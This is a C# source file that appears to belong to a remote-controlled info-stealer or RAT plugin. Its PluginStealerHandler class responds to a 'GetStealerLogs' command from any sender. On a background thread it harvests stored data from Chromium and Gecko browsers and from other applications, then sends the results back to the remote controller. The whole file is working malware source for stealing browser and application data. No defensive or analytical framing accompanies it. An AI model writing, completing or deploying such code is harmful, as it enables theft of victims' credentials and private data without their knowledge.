

using System.Threading;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Structs;
using Plugin.Helper.Stealer;


namespace Plugin.MessageHandlers
{
	public class PluginStealerHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => message is GetStealerLogs;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is GetStealerLogs message1))
				return;
			this.Execute(sender, message1);
		}

		private void Execute(ISender client, GetStealerLogs message)
		{
			new Thread((ThreadStart)(() =>
			{
				ChromiumBrowser[] allInfo1 = Chromium.GetAllInfo(message.chromiumBrowserOptions);
				GeckoBrowser[] allInfo2 = Gecko.GetAllInfo(message.geckoBrowserOptions);
				AppsData allInfo3 = Apps.GetAllInfo(message.appsOptions);
				client.Send<GetStealerLogsResponse>(new GetStealerLogsResponse()
				{
					chromiumData = allInfo1,
					geckoData = allInfo2,
					appsData = allInfo3
				});
			}))
			{
				IsBackground = true
			}.Start();
		}
	}
}